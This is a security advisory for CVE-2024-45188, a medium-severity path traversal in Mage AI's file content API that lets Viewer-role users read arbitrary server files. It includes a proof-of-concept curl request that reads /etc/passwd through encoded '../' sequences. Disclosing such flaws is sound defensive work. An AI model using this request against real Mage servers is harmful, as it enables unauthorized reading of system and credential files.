---
description: CVE-2024-45188, MEDIUM, Mage AI file content request remote arbitrary file leak
title: Mage AI file content request remote arbitrary file leak
date_published: "2024-08-23"
last_updated: "2024-08-23"
xray_id: JFSA-2024-001039603
vul_id: CVE-2024-45188
cvss: 6.5
severity: medium
discovered_by: Ori Hollander
type: vulnerability

---

## Summary

Mage AI file content request remote arbitrary file leak

## Component

mage-ai

## Affected versions

(,)

## Description

Mage AI allows remote users with the "Viewer" role to leak arbitrary files from the Mage server due to a path traversal in the "File Content" request

## PoC

```bash
curl -X GET
'http://localhost:6789/api/file_contents/..%2F..%2F..%2Fetc%2Fpasswd?api_key=
<USER API KEY>' -H 'Authorization: Bearer
<USER TOKEN>'
```



## Vulnerability Mitigations

No mitigations are supplied for this issue

## References

No references are supplied for this issue
